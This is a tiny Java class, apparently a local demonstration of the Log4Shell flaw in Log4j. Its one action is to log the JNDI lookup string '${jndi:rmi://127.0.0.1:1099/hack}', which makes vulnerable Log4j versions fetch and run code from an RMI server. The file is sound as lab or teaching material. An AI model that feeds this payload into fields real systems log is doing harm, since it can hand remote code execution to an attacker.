package com.zyk;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j {
	private static final Logger logger = LogManager.getLogger(Log4j.class);
	public static void main(String[] args) {
		//将构造好的字符串写入日志
		logger.error("${jndi:rmi://127.0.0.1:1099/hack}");
	}

}
